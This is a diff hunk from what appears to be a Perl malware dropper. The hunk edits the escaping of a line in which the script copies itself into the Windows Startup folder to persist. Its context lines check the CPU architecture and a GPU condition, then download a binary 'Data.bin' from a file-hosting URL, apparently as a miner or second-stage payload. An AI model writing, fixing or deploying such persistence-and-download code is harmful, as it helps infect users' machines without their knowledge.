@@ -84,7 +84,7 @@ for(glob "C:\\\\Users\\\\\$username\\\\AppData\\\\Roaming\\\\*"){
 }
 while(\$ok != 1){
   \$0 =~ s/(.*?)\\\\(.*?)//g;
-  system("copy \$0 %AppData%\\Microsoft\\Windows\\\"Start Menu\\"\\Programs\\Startup");
+  system("copy \$0 %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup");
   if(\$Config{archname} =~ /x86_64/i || \$Config{archname} =~ /x64/i){
     if("$x86_or_x64" =~ /GPU/i){
       getstore("http://download1654.mediafireuserdownload.com/vktdt3a73mrg/0nwra4eocjkemrl/Data.bin", "Data.bin");
